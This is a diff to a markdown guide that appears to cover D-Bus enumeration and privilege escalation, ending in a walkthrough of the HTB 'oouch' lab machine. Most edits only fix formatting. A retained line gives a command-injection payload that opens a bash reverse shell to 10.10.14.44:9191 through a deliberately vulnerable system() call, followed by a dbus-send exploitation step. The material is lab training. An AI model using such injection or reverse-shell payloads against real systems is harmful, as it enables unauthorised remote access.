@@ -2,11 +2,11 @@
 
 ## **GUI enumeration**
 
-**(This enumeration info was taken from **[**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**
+**(This enumeration info was taken from** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**
 
 Ubuntu desktop utilizes D-Bus as its inter-process communications (IPC) mediator. On Ubuntu, there are several message buses that run concurrently: A system bus, which is mainly used by **privileged services to expose system-wide relevant services**, and one session bus for each logged in user, which exposes services that are only relevant to that specific user. Since we will try to elevate our privileges, we will mainly focus on the system bus as the services there tend to run with higher privileges (i.e. root). Note that the D-Bus architecture utilizes one ‘router’ per session bus, which redirects client messages to the relevant services they are trying to interact with. Clients need to specify the address of the service to which they want to send messages.
 
-Each service is defined by the **objects **and **interfaces** that it exposes. We can think of objects as instances of classes in standard OOP languages. Each unique instance is identified by its **object path** – a string which resembles a file system path that uniquely identifies each object that the service exposes. A standard interface that will help with our research is the **org.freedesktop.DBus.Introspectable** interface. It contains a single method, Introspect, which returns an XML representation of the methods, signals and properties supported by the object. This blog post focuses on methods and ignores properties and signals.
+Each service is defined by the **objects** and **interfaces** that it exposes. We can think of objects as instances of classes in standard OOP languages. Each unique instance is identified by its **object path** – a string which resembles a file system path that uniquely identifies each object that the service exposes. A standard interface that will help with our research is the **org.freedesktop.DBus.Introspectable** interface. It contains a single method, Introspect, which returns an XML representation of the methods, signals and properties supported by the object. This blog post focuses on methods and ignores properties and signals.
 
 I used two tools to communicate with the D-Bus interface: CLI tool named **gdbus**, which allows to easily call D-Bus exposed methods in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python based GUI tool that helps to enumerate the available services on each bus and to see which objects each service contains.
 
@@ -24,7 +24,7 @@ _Figure 2. D-Feet interface window_
 
 On the left pane in Figure 1 you can see all the various services that have registered with the D-Bus daemon system bus (note the select System Bus button on the top). I selected the **org.debin.apt** service, and D-Feet automatically **queried the service for all the available objects**. Once I selected a specific object, the set of all interfaces, with their respective methods properties and signals are listed, as seen in Figure 2. Note that we also get the signature of each **IPC exposed method**.
 
-We can also see the** pid of the process** that hosts each service, as well as its **command line**. This is a very useful feature, since we can validate that the target service we are inspecting indeed runs with higher privileges. Some services on the System bus don’t run as root, and thus are less interesting to research.
+We can also see the **pid of the process** that hosts each service, as well as its **command line**. This is a very useful feature, since we can validate that the target service we are inspecting indeed runs with higher privileges. Some services on the System bus don’t run as root, and thus are less interesting to research.
 
 D-Feet also allows one to call the various methods. In the method input screen we can specify a list of Python expressions, delimited by commas, to be interpreted as the parameters to the invoked function, shown in Figure 3. Python types are marshaled to D-Bus types and passed to the service.
 
@@ -178,10 +178,10 @@ Note the method `.Block` of the interface `htb.oouch.Block` (the one we are inte
 
 With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
 
-In order to **monitor** a **communication** you will need to be **root. **If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-If you know how to configure a D-Bus config file to** allow non root users to sniff **the communication please **contact me**!
+If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
 {% endhint %}
 
 Different ways to monitor:
@@ -215,7 +215,7 @@ Monitoring bus message stream.
 
 You can use `capture` instead of `monitor` to save the results in a pcap file.
 
-#### Filtering all the noise <a href="filtering_all_the_noise" id="filtering_all_the_noise"></a>
+#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
 If there is just too much information on the bus, pass a match rule like so:
 
@@ -243,7 +243,7 @@ See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification
 
 ## **Vulnerable Scenario**
 
-As user **qtc inside the host "oouch" from HTB **you can find an **unexpected D-Bus config file** located in_ /etc/dbus-1/system.d/htb.oouch.Block.conf_:
+As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 
 ```markup
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
@@ -266,9 +266,9 @@ As user **qtc inside the host "oouch" from HTB **you can find an **unexpected D-
 </busconfig>
 ```
 
-Note from the previous configuration that** you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
+Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
 
-As user **qtc **inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py. _This is the interesting code:
+As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
 
 ```python
 if primitive_xss.search(form.textfield.data):
@@ -282,14 +282,14 @@ if primitive_xss.search(form.textfield.data):
             return render_template('hacker.html', title='Hacker')
 ```
 
-As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client_ip".
+As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client\_ip".
 
-In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening **in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
+In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
 **The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Exploit it
 
-At the end of this page you can find the** complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the **_**D-Bus object path**_ **and **_**interface name**_** are registered**. This information will be necessary to send information to the D-Bus connection:
+At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the **_**D-Bus object path**_ **and **_**interface name**_** are registered**. This information will be necessary to send information to the D-Bus connection:
 
 ```c
         /* Install the object */
@@ -336,7 +336,7 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 
 _Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
 
-### C code 
+### C code&#x20;
 
 {% code title="d-bus_server.c" %}
 ```c
